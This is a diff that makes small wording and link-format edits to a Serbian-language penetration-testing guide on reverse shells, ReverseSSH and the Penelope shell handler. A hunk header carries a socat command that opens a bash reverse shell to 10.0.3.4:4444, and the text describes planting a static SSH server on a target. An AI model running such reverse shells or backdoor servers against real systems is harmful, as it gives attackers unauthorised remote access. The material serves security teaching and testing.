@@ -67,7 +67,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Praktičan način za **interaktivni pristup ljusci**, kao i **prenos fajlova** i **prosleđivanje portova**, je postavljanje statički povezanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na cilj.
+Pogodan način za **interaktivni pristup ljusci**, kao i **prenos fajlova** i **prosleđivanje portova**, je postavljanje statički povezanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na cilj.
 
 Ispod je primer za `x86` sa upx-kompresovanim binarnim datotekama. Za druge binarne datoteke, proverite [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -114,7 +114,7 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-Penelope (https://github.com/brightio/penelope) automatski unapređuje Linux reverse shells u TTY, upravlja veličinom terminala, beleži sve i još mnogo toga. Takođe pruža readline podršku za Windows shell-ove.
+[Penelope](https://github.com/brightio/penelope) automatski unapređuje Linux reverse shells u TTY, upravlja veličinom terminala, beleži sve i još mnogo toga. Takođe pruža readline podršku za Windows shell-ove.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
